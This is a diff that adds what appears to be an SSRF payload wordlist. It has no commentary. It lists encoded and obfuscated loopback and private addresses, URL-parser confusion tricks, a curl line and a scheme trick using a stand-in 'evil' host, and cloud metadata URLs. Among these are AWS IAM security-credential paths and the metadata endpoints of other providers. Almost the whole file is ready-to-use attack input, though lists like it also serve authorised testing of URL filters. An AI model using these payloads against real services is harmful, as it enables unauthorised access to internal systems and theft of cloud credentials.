@@ -1,0 +1,111 @@
+http://localhost:80
+http://localhost:443
+http://localhost:22
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://0.0.0.0:80
+http://0.0.0.0:443
+http://0.0.0.0:22
+https://127.0.0.1/
+https://localhost/
+http://[::]:80/
+http://[::]:25/ SMTP
+http://[::]:22/ SSH
+http://[::]:3128/ Squid
+http://[0000::1]:80/
+http://[0000::1]:25/ SMTP
+http://[0000::1]:22/ SSH
+http://[0000::1]:3128/ Squid
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+http://2130706433/ = http://127.0.0.1
+http://3232235521/ = http://192.168.0.1
+http://3232235777/ = http://192.168.1.1
+http://2852039166/ = http://169.254.169.254
+http://0177.0.0.1/ = http://127.0.0.1
+http://o177.0.0.1/ = http://127.0.0.1
+http://0o177.0.0.1/ = http://127.0.0.1
+http://q177.0.0.1/ = http://127.0.0.1
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://[::ffff:127.0.0.1]
+localhost:+11211aaa
+localhost:00011211aaaa
+http://0/
+http://127.1
+http://127.0.1
+http://127.0.0.1/%61dmin
+http://127.0.0.1/%2561dmin
+curl -v "http://evil$google.com"
+$google = ""
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
+urllib2 : 1.1.1.1
+requests + browsers : 2.2.2.2
+urllib : 3.3.3.3
+http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
+List:
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
+0://evil.com:80;http://google.com:80/ 
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+jar:scheme://domain/path!/ 
+jar:http://127.0.0.1!/
+jar:https://127.0.0.1!/
+jar:ftp://127.0.0.1!/
+ssrf.php?url=http://127.0.0.1:22
+ssrf.php?url=http://127.0.0.1:80
+ssrf.php?url=http://127.0.0.1:443
+http://instance-data
+http://169.254.169.254
+http://169.254.169.254.nip.io/
+Static:http://nicob.net/redir6a
+Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
+http://425.510.425.510 Dotted decimal with overflow
+http://2852039166 Dotless decimal
+http://7147006462 Dotless decimal with overflow
+http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal
+http://0xA9FEA9FE Dotless hexadecimal
+http://0x41414141A9FEA9FE Dotless hexadecimal with overflow
+http://0251.0376.0251.0376 Dotted octal
+http://0251.00376.000251.0000376 Dotted octal with padding
+http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
+http://[::ffff:a9fe:a9fe] IPV6 Compressed
+http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded
+http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4
+http://[fd00:ec2::254] IPV6
+http://169.254.169.254/latest/meta-data/iam/security-credentials
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/metadata/v1/maintenance
+http://169.254.169.254/metadata/instance?api-version=2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+http://169.254.169.254/openstack
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/attributes/
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+http://169.254.169.254/hetzner/v1/metadata
+http://169.254.169.254/hetzner/v1/metadata/hostname
+http://169.254.169.254/hetzner/v1/metadata/instance-id
+http://169.254.169.254/hetzner/v1/metadata/public-ipv4
+http://169.254.169.254/hetzner/v1/metadata/private-networks
+http://169.254.169.254/hetzner/v1/metadata/availability-zone
+http://169.254.169.254/hetzner/v1/metadata/region
+
+
